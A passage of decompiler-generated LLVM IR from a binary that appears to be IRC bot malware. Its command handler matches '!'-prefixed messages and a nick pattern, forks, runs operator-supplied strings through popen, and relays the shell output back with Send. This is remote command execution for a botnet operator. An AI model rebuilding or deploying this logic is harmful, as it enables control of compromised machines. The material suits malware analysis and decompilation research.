  %v2_10010d70 = icmp ult i32 %v0_10010d70, %v0_10010d68
  br i1 %v2_10010d70, label %dec_label_pc_10010d78, label %dec_label_pc_10010d98

dec_label_pc_10010d78:                            ; preds = %dec_label_pc_10010d10, %dec_label_pc_10010d54
  %storemerge9103 = phi i32 [ %v1_10010d58, %dec_label_pc_10010d54 ], [ 0, %dec_label_pc_10010d10 ]
  %v2_10010d84 = add i32 %storemerge9103, %arg2
  %v1_10010d88 = inttoptr i32 %v2_10010d84 to i8*
  %v2_10010d88 = load i8, i8* %v1_10010d88, align 1
  %v3_10010d90 = icmp eq i8 %v2_10010d88, 33
  br i1 %v3_10010d90, label %dec_label_pc_10010d98, label %dec_label_pc_10010d54

dec_label_pc_10010d98:                            ; preds = %dec_label_pc_10010d54, %dec_label_pc_10010d78, %dec_label_pc_10010d10
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_10010d10 ], [ %v1_10010d58, %dec_label_pc_10010d54 ], [ %storemerge9103, %dec_label_pc_10010d78 ]
  %v2_10010da4 = add i32 %storemerge9.lcssa, %arg2
  %v3_10010dac = inttoptr i32 %v2_10010da4 to i8*
  store i8 0, i8* %v3_10010dac, align 1
  %v2_10010db4 = load i8, i8* %v5_10010d44, align 1
  %v3_10010dbc = icmp eq i8 %v2_10010db4, 33
  br i1 %v3_10010dbc, label %dec_label_pc_10010dc4, label %dec_label_pc_10011c74

dec_label_pc_10010dc4:                            ; preds = %dec_label_pc_10010d98
  %v3_10010dc8 = load i32, i32* @global_var_100451c4.545, align 4
  store i32 %arg3, i32* @r3, align 4
  store i32 %v3_10010dc8, i32* @r4, align 4
  %v2_10010dd4 = call i32 @__GI_strcasecmp(i32 %arg3, i32 %v3_10010dc8)
  store i32 %v2_10010dd4, i32* %r3.global-to-local, align 4
  %v3_10010ddc = icmp eq i32 %v2_10010dd4, 0
  br i1 %v3_10010ddc, label %dec_label_pc_10010de4, label %dec_label_pc_10011c74

dec_label_pc_10010de4:                            ; preds = %dec_label_pc_10010dc4
  %v2_10010de4 = ptrtoint i32* %stack_var_-2092 to i32
  store i32 %v2_10010de4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10010dfc.872 to i32), i32* @lr, align 4
  %v0_10010df8 = call i32 @__GI_memset()
  %v1_10010e08 = add i32 %v2_10010d1c, 3
  %v5_10010e0c = inttoptr i32 %v1_10010e08 to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10010e08, i32* @r3, align 4
  %v0_10010e3090 = call i32 @__GI_strlen()
  store i32 %v0_10010e3090, i32* %r3.global-to-local, align 4
  %v0_10010e3891 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010e3892 = icmp ult i32 %v0_10010e3891, %v0_10010e3090
  br i1 %v2_10010e3892, label %dec_label_pc_10010e40, label %dec_label_pc_10010e60

dec_label_pc_10010e1c:                            ; preds = %dec_label_pc_10010e40
  %v1_10010e20 = add i32 %storemerge1095, 1
  store i32 %v1_10010e20, i32* %r29.global-to-local, align 4
  store i32 %v1_10010e08, i32* @r3, align 4
  %v0_10010e30 = call i32 @__GI_strlen()
  store i32 %v0_10010e30, i32* %r3.global-to-local, align 4
  %v0_10010e38 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010e38 = icmp ult i32 %v0_10010e38, %v0_10010e30
  br i1 %v2_10010e38, label %dec_label_pc_10010e40, label %dec_label_pc_10010e60

dec_label_pc_10010e40:                            ; preds = %dec_label_pc_10010de4, %dec_label_pc_10010e1c
  %storemerge1095 = phi i32 [ %v1_10010e20, %dec_label_pc_10010e1c ], [ 0, %dec_label_pc_10010de4 ]
  %v2_10010e4c = add i32 %storemerge1095, %v1_10010e08
  %v1_10010e50 = inttoptr i32 %v2_10010e4c to i8*
  %v2_10010e50 = load i8, i8* %v1_10010e50, align 1
  %v3_10010e58 = icmp eq i8 %v2_10010e50, 32
  br i1 %v3_10010e58, label %dec_label_pc_10010e60, label %dec_label_pc_10010e1c

dec_label_pc_10010e60:                            ; preds = %dec_label_pc_10010e1c, %dec_label_pc_10010e40, %dec_label_pc_10010de4
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_10010de4 ], [ %v1_10010e20, %dec_label_pc_10010e1c ], [ %storemerge1095, %dec_label_pc_10010e40 ]
  %v2_10010e6c = add i32 %storemerge10.lcssa, %v1_10010e08
  %v3_10010e74 = inttoptr i32 %v2_10010e6c to i8*
  store i8 0, i8* %v3_10010e74, align 1
  %v3_10010e7c = load i32, i32* @global_var_10045198.65, align 4
  store i32 %v1_10010e08, i32* %r3.global-to-local, align 4
  store i32 268504716, i32* @lr, align 4
  %v4_10010e88 = call i32 @strwildmatch(i8* %v5_10010e0c, i32 %v3_10010e7c, i32 268697600)
  store i32 %v4_10010e88, i32* %r3.global-to-local, align 4
  %v3_10010e90 = icmp eq i32 %v4_10010e88, 0
  br i1 %v3_10010e90, label %dec_label_pc_10010e98, label %dec_label_pc_10011c74

dec_label_pc_10010e98:                            ; preds = %dec_label_pc_10010e60
  %v1_10010ea4 = add i32 %v2_10010e6c, 1
  %v5_10010ea8 = inttoptr i32 %v1_10010ea4 to i8*
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1002d44c.873 to i32), i32* @r4, align 4
  %v5_10010ebc = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([5 x i8]* @global_var_1002d44c.873 to i32), i32 4)
  store i32 %v5_10010ebc, i32* %r3.global-to-local, align 4
  %v3_10010ec4 = icmp eq i32 %v5_10010ebc, 0
  br i1 %v3_10010ec4, label %dec_label_pc_10010ecc, label %dec_label_pc_10010f1c

dec_label_pc_10010ecc:                            ; preds = %dec_label_pc_10010e98
  %v3_10010ed0 = load i8, i8* @global_var_10045170.23, align 1
  %v3_10010ed8 = icmp eq i8 %v3_10010ed0, 0
  br i1 %v3_10010ed8, label %dec_label_pc_10010efc, label %dec_label_pc_10010ee0

dec_label_pc_10010ee0:                            ; preds = %dec_label_pc_10010ecc
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_10010ef4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1002a06c.25 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v6_10010ef4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010f1c

dec_label_pc_10010efc:                            ; preds = %dec_label_pc_10010ecc
  %v1_10010f00 = add i32 %v2_10010e6c, 5
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_10010f18 = call i32 @Send(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_1002d454.875 to i32), i32 %v1_10010f00, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v6_10010f18, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010f1c

dec_label_pc_10010f1c:                            ; preds = %dec_label_pc_10010e98, %dec_label_pc_10010ee0, %dec_label_pc_10010efc
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002d458.876 to i32), i32* @r4, align 4
  %v5_10010f2c = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([4 x i8]* @global_var_1002d458.876 to i32), i32 3)
  store i32 %v5_10010f2c, i32* %r3.global-to-local, align 4
  %v3_10010f34 = icmp eq i32 %v5_10010f2c, 0
  br i1 %v3_10010f34, label %dec_label_pc_10010f3c, label %dec_label_pc_1001101c

dec_label_pc_10010f3c:                            ; preds = %dec_label_pc_10010f1c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10010f40 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10010f40, i32* %r3.global-to-local, align 4
  %v3_10010f48 = icmp eq i32 %v1_10010f40, 0
  br i1 %v3_10010f48, label %dec_label_pc_10010f50, label %dec_label_pc_10011c74

dec_label_pc_10010f50:                            ; preds = %dec_label_pc_10010f3c
  %v2_10010f50 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10010f50, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268504932, i32* @lr, align 4
  %v0_10010f60 = call i32 @__GI_memset()
  store i32 %v2_10010f50, i32* @r3, align 4
  store i32 268504968, i32* @lr, align 4
  %v1_10010f84 = call i32 @sprintf(i32 %v2_10010f50)
  store i32 %v2_10010f50, i32* %r3.global-to-local, align 4
  store i32 268504988, i32* @lr, align 4
  %v5_10010f98 = call i32 @popen(i32 %v2_10010f50, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10010f98, i32* %r3.global-to-local, align 4
  store i32 268505088, i32* @lr, align 4
  %v1_10010ffc86 = call i32 @feof(i32 %v5_10010f98)
  store i32 %v1_10010ffc86, i32* %r3.global-to-local, align 4
  %v3_1001100489 = icmp eq i32 %v1_10010ffc86, 0
  br i1 %v3_1001100489, label %dec_label_pc_10010fa8, label %dec_label_pc_1001100c

dec_label_pc_10010fa8:                            ; preds = %dec_label_pc_10010f50, %dec_label_pc_10010fa8
  store i32 %v2_10010f50, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505020, i32* @lr, align 4
  %v0_10010fb8 = call i32 @__GI_memset()
  store i32 %v2_10010f50, i32* %r3.global-to-local, align 4
  store i32 268505040, i32* @lr, align 4
  %v3_10010fcc = call i32 @fgets(i32 %v2_10010f50, i32 1024, i32 %v5_10010f98)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_10010fec = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), i32 %arg2, i32 %v2_10010f50)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268505080, i32* @lr, align 4
  %v1_10010ff4 = call i32 @sleep(i32 1)
  store i32 %v5_10010f98, i32* %r3.global-to-local, align 4
  store i32 268505088, i32* @lr, align 4
  %v1_10010ffc = call i32 @feof(i32 %v5_10010f98)
  store i32 %v1_10010ffc, i32* %r3.global-to-local, align 4
  %v3_10011004 = icmp eq i32 %v1_10010ffc, 0
  br i1 %v3_10011004, label %dec_label_pc_10010fa8, label %dec_label_pc_1001100c

dec_label_pc_1001100c:                            ; preds = %dec_label_pc_10010fa8, %dec_label_pc_10010f50
  store i32 %v5_10010f98, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011014.880 to i32), i32* @lr, align 4
  %v1_10011010 = call i32 @pclose(i32 %v5_10010f98)
  %v0_10011018 = call i32 @__GI_exit()
  store i32 %v0_10011018, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001101c

dec_label_pc_1001101c:                            ; preds = %dec_label_pc_10010f1c, %dec_label_pc_1001100c
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1002d4b4.881 to i32), i32* @r4, align 4
  %v5_1001102c = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([5 x i8]* @global_var_1002d4b4.881 to i32), i32 4)
  store i32 %v5_1001102c, i32* %r3.global-to-local, align 4
  %v3_10011034 = icmp eq i32 %v5_1001102c, 0
  br i1 %v3_10011034, label %dec_label_pc_1001103c, label %dec_label_pc_1001111c

dec_label_pc_1001103c:                            ; preds = %dec_label_pc_1001101c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10011040 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10011040, i32* %r3.global-to-local, align 4
  %v3_10011048 = icmp eq i32 %v1_10011040, 0
  br i1 %v3_10011048, label %dec_label_pc_10011050, label %dec_label_pc_10011c74

dec_label_pc_10011050:                            ; preds = %dec_label_pc_1001103c
  %v2_10011050 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10011050, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505188, i32* @lr, align 4
  %v0_10011060 = call i32 @__GI_memset()
  store i32 %v2_10011050, i32* @r3, align 4
  store i32 268505224, i32* @lr, align 4
  %v1_10011084 = call i32 @sprintf(i32 %v2_10011050)
  store i32 %v2_10011050, i32* %r3.global-to-local, align 4
  store i32 268505244, i32* @lr, align 4
  %v5_10011098 = call i32 @popen(i32 %v2_10011050, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011098, i32* %r3.global-to-local, align 4
  store i32 268505344, i32* @lr, align 4
  %v1_100110fc82 = call i32 @feof(i32 %v5_10011098)
  store i32 %v1_100110fc82, i32* %r3.global-to-local, align 4
  %v3_1001110485 = icmp eq i32 %v1_100110fc82, 0
  br i1 %v3_1001110485, label %dec_label_pc_100110a8, label %dec_label_pc_1001110c

dec_label_pc_100110a8:                            ; preds = %dec_label_pc_10011050, %dec_label_pc_100110a8
  store i32 %v2_10011050, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505276, i32* @lr, align 4
  %v0_100110b8 = call i32 @__GI_memset()
  store i32 %v2_10011050, i32* %r3.global-to-local, align 4
  store i32 268505296, i32* @lr, align 4
  %v3_100110cc = call i32 @fgets(i32 %v2_10011050, i32 1024, i32 %v5_10011098)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100110ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), i32 %arg2, i32 %v2_10011050)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268505336, i32* @lr, align 4
  %v1_100110f4 = call i32 @sleep(i32 1)
  store i32 %v5_10011098, i32* %r3.global-to-local, align 4
  store i32 268505344, i32* @lr, align 4
  %v1_100110fc = call i32 @feof(i32 %v5_10011098)
  store i32 %v1_100110fc, i32* %r3.global-to-local, align 4
  %v3_10011104 = icmp eq i32 %v1_100110fc, 0
  br i1 %v3_10011104, label %dec_label_pc_100110a8, label %dec_label_pc_1001110c

dec_label_pc_1001110c:                            ; preds = %dec_label_pc_100110a8, %dec_label_pc_10011050
  store i32 %v5_10011098, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011114.884 to i32), i32* @lr, align 4
  %v1_10011110 = call i32 @pclose(i32 %v5_10011098)
  %v0_10011118 = call i32 @__GI_exit()
  store i32 %v0_10011118, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001111c

dec_label_pc_1001111c:                            ; preds = %dec_label_pc_1001101c, %dec_label_pc_1001110c
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002d520.885 to i32), i32* @r4, align 4
  %v5_1001112c = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([7 x i8]* @global_var_1002d520.885 to i32), i32 6)
  store i32 %v5_1001112c, i32* %r3.global-to-local, align 4
  %v3_10011134 = icmp eq i32 %v5_1001112c, 0
  br i1 %v3_10011134, label %dec_label_pc_1001113c, label %dec_label_pc_1001121c

dec_label_pc_1001113c:                            ; preds = %dec_label_pc_1001111c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10011140 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10011140, i32* %r3.global-to-local, align 4
  %v3_10011148 = icmp eq i32 %v1_10011140, 0
  br i1 %v3_10011148, label %dec_label_pc_10011150, label %dec_label_pc_10011c74

dec_label_pc_10011150:                            ; preds = %dec_label_pc_1001113c
  %v2_10011150 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10011150, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505444, i32* @lr, align 4
  %v0_10011160 = call i32 @__GI_memset()
  store i32 %v2_10011150, i32* @r3, align 4
  store i32 268505480, i32* @lr, align 4
  %v1_10011184 = call i32 @sprintf(i32 %v2_10011150)
  store i32 %v2_10011150, i32* %r3.global-to-local, align 4
  store i32 268505500, i32* @lr, align 4
  %v5_10011198 = call i32 @popen(i32 %v2_10011150, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011198, i32* %r3.global-to-local, align 4
  store i32 268505600, i32* @lr, align 4
  %v1_100111fc78 = call i32 @feof(i32 %v5_10011198)
  store i32 %v1_100111fc78, i32* %r3.global-to-local, align 4
  %v3_1001120481 = icmp eq i32 %v1_100111fc78, 0
  br i1 %v3_1001120481, label %dec_label_pc_100111a8, label %dec_label_pc_1001120c

dec_label_pc_100111a8:                            ; preds = %dec_label_pc_10011150, %dec_label_pc_100111a8
  store i32 %v2_10011150, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505532, i32* @lr, align 4
  %v0_100111b8 = call i32 @__GI_memset()
  store i32 %v2_10011150, i32* %r3.global-to-local, align 4
  store i32 268505552, i32* @lr, align 4
  %v3_100111cc = call i32 @fgets(i32 %v2_10011150, i32 1024, i32 %v5_10011198)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100111ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), i32 %arg2, i32 %v2_10011150)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268505592, i32* @lr, align 4
  %v1_100111f4 = call i32 @sleep(i32 1)
  store i32 %v5_10011198, i32* %r3.global-to-local, align 4
  store i32 268505600, i32* @lr, align 4
  %v1_100111fc = call i32 @feof(i32 %v5_10011198)
  store i32 %v1_100111fc, i32* %r3.global-to-local, align 4
  %v3_10011204 = icmp eq i32 %v1_100111fc, 0
  br i1 %v3_10011204, label %dec_label_pc_100111a8, label %dec_label_pc_1001120c

dec_label_pc_1001120c:                            ; preds = %dec_label_pc_100111a8, %dec_label_pc_10011150
  store i32 %v5_10011198, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011214.888 to i32), i32* @lr, align 4
  %v1_10011210 = call i32 @pclose(i32 %v5_10011198)
  %v0_10011218 = call i32 @__GI_exit()
  store i32 %v0_10011218, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001121c

dec_label_pc_1001121c:                            ; preds = %dec_label_pc_1001111c, %dec_label_pc_1001120c
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002d674.889 to i32), i32* @r4, align 4
  %v5_1001122c = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([8 x i8]* @global_var_1002d674.889 to i32), i32 7)
  store i32 %v5_1001122c, i32* %r3.global-to-local, align 4
  %v3_10011234 = icmp eq i32 %v5_1001122c, 0
  br i1 %v3_10011234, label %dec_label_pc_1001123c, label %dec_label_pc_1001131c

dec_label_pc_1001123c:                            ; preds = %dec_label_pc_1001121c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10011240 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10011240, i32* %r3.global-to-local, align 4
  %v3_10011248 = icmp eq i32 %v1_10011240, 0
  br i1 %v3_10011248, label %dec_label_pc_10011250, label %dec_label_pc_10011c74

dec_label_pc_10011250:                            ; preds = %dec_label_pc_1001123c
  %v2_10011250 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10011250, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505700, i32* @lr, align 4
  %v0_10011260 = call i32 @__GI_memset()
  store i32 %v2_10011250, i32* @r3, align 4
  store i32 268505736, i32* @lr, align 4
  %v1_10011284 = call i32 @sprintf(i32 %v2_10011250)
  store i32 %v2_10011250, i32* %r3.global-to-local, align 4
  store i32 268505756, i32* @lr, align 4
  %v5_10011298 = call i32 @popen(i32 %v2_10011250, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011298, i32* %r3.global-to-local, align 4
  store i32 268505856, i32* @lr, align 4
  %v1_100112fc74 = call i32 @feof(i32 %v5_10011298)
  store i32 %v1_100112fc74, i32* %r3.global-to-local, align 4
  %v3_1001130477 = icmp eq i32 %v1_100112fc74, 0
  br i1 %v3_1001130477, label %dec_label_pc_100112a8, label %dec_label_pc_1001130c

dec_label_pc_100112a8:                            ; preds = %dec_label_pc_10011250, %dec_label_pc_100112a8
  store i32 %v2_10011250, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505788, i32* @lr, align 4
  %v0_100112b8 = call i32 @__GI_memset()
  store i32 %v2_10011250, i32* %r3.global-to-local, align 4
  store i32 268505808, i32* @lr, align 4
  %v3_100112cc = call i32 @fgets(i32 %v2_10011250, i32 1024, i32 %v5_10011298)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100112ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), i32 %arg2, i32 %v2_10011250)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268505848, i32* @lr, align 4
  %v1_100112f4 = call i32 @sleep(i32 1)
  store i32 %v5_10011298, i32* %r3.global-to-local, align 4
  store i32 268505856, i32* @lr, align 4
  %v1_100112fc = call i32 @feof(i32 %v5_10011298)
  store i32 %v1_100112fc, i32* %r3.global-to-local, align 4
  %v3_10011304 = icmp eq i32 %v1_100112fc, 0
  br i1 %v3_10011304, label %dec_label_pc_100112a8, label %dec_label_pc_1001130c

dec_label_pc_1001130c:                            ; preds = %dec_label_pc_100112a8, %dec_label_pc_10011250
  store i32 %v5_10011298, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011314.892 to i32), i32* @lr, align 4
  %v1_10011310 = call i32 @pclose(i32 %v5_10011298)
  %v0_10011318 = call i32 @__GI_exit()
  store i32 %v0_10011318, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001131c

dec_label_pc_1001131c:                            ; preds = %dec_label_pc_1001121c, %dec_label_pc_1001130c
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1002d918.893 to i32), i32* @r4, align 4
  %v5_1001132c = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([9 x i8]* @global_var_1002d918.893 to i32), i32 8)
  store i32 %v5_1001132c, i32* %r3.global-to-local, align 4
  %v3_10011334 = icmp eq i32 %v5_1001132c, 0
  br i1 %v3_10011334, label %dec_label_pc_1001133c, label %dec_label_pc_1001141c

dec_label_pc_1001133c:                            ; preds = %dec_label_pc_1001131c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10011340 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10011340, i32* %r3.global-to-local, align 4
  %v3_10011348 = icmp eq i32 %v1_10011340, 0
  br i1 %v3_10011348, label %dec_label_pc_10011350, label %dec_label_pc_10011c74

dec_label_pc_10011350:                            ; preds = %dec_label_pc_1001133c
  %v2_10011350 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10011350, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505956, i32* @lr, align 4
  %v0_10011360 = call i32 @__GI_memset()
  store i32 %v2_10011350, i32* @r3, align 4
  store i32 268505992, i32* @lr, align 4
  %v1_10011384 = call i32 @sprintf(i32 %v2_10011350)
  store i32 %v2_10011350, i32* %r3.global-to-local, align 4
  store i32 268506012, i32* @lr, align 4
  %v5_10011398 = call i32 @popen(i32 %v2_10011350, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011398, i32* %r3.global-to-local, align 4
  store i32 268506112, i32* @lr, align 4
  %v1_100113fc70 = call i32 @feof(i32 %v5_10011398)
  store i32 %v1_100113fc70, i32* %r3.global-to-local, align 4
  %v3_1001140473 = icmp eq i32 %v1_100113fc70, 0
  br i1 %v3_1001140473, label %dec_label_pc_100113a8, label %dec_label_pc_1001140c

dec_label_pc_100113a8:                            ; preds = %dec_label_pc_10011350, %dec_label_pc_100113a8
  store i32 %v2_10011350, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506044, i32* @lr, align 4
  %v0_100113b8 = call i32 @__GI_memset()
  store i32 %v2_10011350, i32* %r3.global-to-local, align 4
  store i32 268506064, i32* @lr, align 4
  %v3_100113cc = call i32 @fgets(i32 %v2_10011350, i32 1024, i32 %v5_10011398)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100113ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), i32 %arg2, i32 %v2_10011350)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268506104, i32* @lr, align 4
  %v1_100113f4 = call i32 @sleep(i32 1)
  store i32 %v5_10011398, i32* %r3.global-to-local, align 4
  store i32 268506112, i32* @lr, align 4
  %v1_100113fc = call i32 @feof(i32 %v5_10011398)
  store i32 %v1_100113fc, i32* %r3.global-to-local, align 4
  %v3_10011404 = icmp eq i32 %v1_100113fc, 0
  br i1 %v3_10011404, label %dec_label_pc_100113a8, label %dec_label_pc_1001140c

dec_label_pc_1001140c:                            ; preds = %dec_label_pc_100113a8, %dec_label_pc_10011350
  store i32 %v5_10011398, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011414.896 to i32), i32* @lr, align 4
  %v1_10011410 = call i32 @pclose(i32 %v5_10011398)
  %v0_10011418 = call i32 @__GI_exit()
  store i32 %v0_10011418, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001141c

dec_label_pc_1001141c:                            ; preds = %dec_label_pc_1001131c, %dec_label_pc_1001140c
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1002daac.897 to i32), i32* @r4, align 4
  %v5_1001142c = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([11 x i8]* @global_var_1002daac.897 to i32), i32 10)
  store i32 %v5_1001142c, i32* %r3.global-to-local, align 4
  %v3_10011434 = icmp eq i32 %v5_1001142c, 0
  br i1 %v3_10011434, label %dec_label_pc_1001143c, label %dec_label_pc_1001151c

dec_label_pc_1001143c:                            ; preds = %dec_label_pc_1001141c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10011440 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10011440, i32* %r3.global-to-local, align 4
  %v3_10011448 = icmp eq i32 %v1_10011440, 0
  br i1 %v3_10011448, label %dec_label_pc_10011450, label %dec_label_pc_10011c74

dec_label_pc_10011450:                            ; preds = %dec_label_pc_1001143c
  %v2_10011450 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10011450, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506212, i32* @lr, align 4
  %v0_10011460 = call i32 @__GI_memset()
  store i32 %v2_10011450, i32* @r3, align 4
  store i32 268506248, i32* @lr, align 4
  %v1_10011484 = call i32 @sprintf(i32 %v2_10011450)
  store i32 %v2_10011450, i32* %r3.global-to-local, align 4
  store i32 268506268, i32* @lr, align 4
  %v5_10011498 = call i32 @popen(i32 %v2_10011450, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011498, i32* %r3.global-to-local, align 4
  store i32 268506368, i32* @lr, align 4
  %v1_100114fc66 = call i32 @feof(i32 %v5_10011498)
  store i32 %v1_100114fc66, i32* %r3.global-to-local, align 4
  %v3_1001150469 = icmp eq i32 %v1_100114fc66, 0
  br i1 %v3_1001150469, label %dec_label_pc_100114a8, label %dec_label_pc_1001150c

dec_label_pc_100114a8:                            ; preds = %dec_label_pc_10011450, %dec_label_pc_100114a8
  store i32 %v2_10011450, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506300, i32* @lr, align 4
  %v0_100114b8 = call i32 @__GI_memset()
  store i32 %v2_10011450, i32* %r3.global-to-local, align 4
  store i32 268506320, i32* @lr, align 4
  %v3_100114cc = call i32 @fgets(i32 %v2_10011450, i32 1024, i32 %v5_10011498)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100114ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), i32 %arg2, i32 %v2_10011450)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268506360, i32* @lr, align 4
  %v1_100114f4 = call i32 @sleep(i32 1)
  store i32 %v5_10011498, i32* %r3.global-to-local, align 4
  store i32 268506368, i32* @lr, align 4
  %v1_100114fc = call i32 @feof(i32 %v5_10011498)
  store i32 %v1_100114fc, i32* %r3.global-to-local, align 4
  %v3_10011504 = icmp eq i32 %v1_100114fc, 0
  br i1 %v3_10011504, label %dec_label_pc_100114a8, label %dec_label_pc_1001150c

